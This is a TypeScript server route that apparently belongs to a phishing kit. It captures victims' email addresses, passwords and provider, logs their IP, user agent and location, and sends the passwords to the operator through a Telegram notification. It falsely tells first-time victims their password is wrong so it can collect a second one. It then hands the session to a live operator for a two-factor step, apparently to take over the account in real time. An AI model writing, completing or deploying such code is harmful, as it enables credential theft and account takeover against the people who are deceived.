import {
  assertConsent,
  ensureSession,
  getClientIp,
  getSessionId,
  jsonWithSession,
} from "@/lib/server/request";
import {
  appendSubmission,
  ensureCallbackKey,
  start2faFlow,
  upsertSession,
} from "@/lib/server/store";
import { isGmailProvider } from "@/lib/providers";
import { notifyTelegramSubmission } from "@/lib/server/telegram";
import { resolveAndCacheSessionLocation } from "@/lib/server/geolocation";

type Body = {
  email?: string;
  password?: string;
  provider?: string;
};

export async function POST(request: Request) {
  const sessionId = await getSessionId();
  const denied = await assertConsent(sessionId);
  if (denied) return denied;

  const body = (await request.json()) as Body;
  const ip = getClientIp(request);
  const userAgent = request.headers.get("user-agent") ?? undefined;
  const provider = body.provider ?? "UNKNOWN";

  await ensureSession(sessionId);

  const current = await ensureSession(sessionId);
  const attempts = current.passwordAttempts + 1;
  const previousPassword = current.lastSubmittedPassword;

  appendSubmission({
    sessionId,
    type: "credentials",
    provider,
    email: body.email,
    password: body.password,
    ip,
  });

  await upsertSession(sessionId, {
    email: body.email,
    provider,
    passwordAttempts: attempts,
    lastSubmittedPassword: body.password,
    ip,
    userAgent,
    decision: null,
  });

  await resolveAndCacheSessionLocation(sessionId, ip);
  await ensureCallbackKey(sessionId);

  // Clear stale operator number before building the new submission keyboard.
  await upsertSession(sessionId, { promptNumber: undefined });

  try {
    await notifyTelegramSubmission(sessionId, {
      password: body.password,
      attempt: attempts,
      previousPassword:
        attempts >= 2 && previousPassword ? previousPassword : undefined,
    });
  } catch (error) {
    console.error("Telegram submission notification failed:", error);
    return jsonWithSession(
      { success: false, error: "Failed to send notification" },
      sessionId,
      { status: 502 },
    );
  }

  if (attempts === 1 && !isGmailProvider(provider)) {
    return jsonWithSession(
      {
        success: true,
        phase: "password-retry",
        message: "Wrong password. Try again.",
      },
      sessionId,
    );
  }

  await start2faFlow(sessionId);
  return jsonWithSession(
    {
      success: true,
      phase: "await-operator",
      message: "Awaiting operator decision",
    },
    sessionId,
  );
}
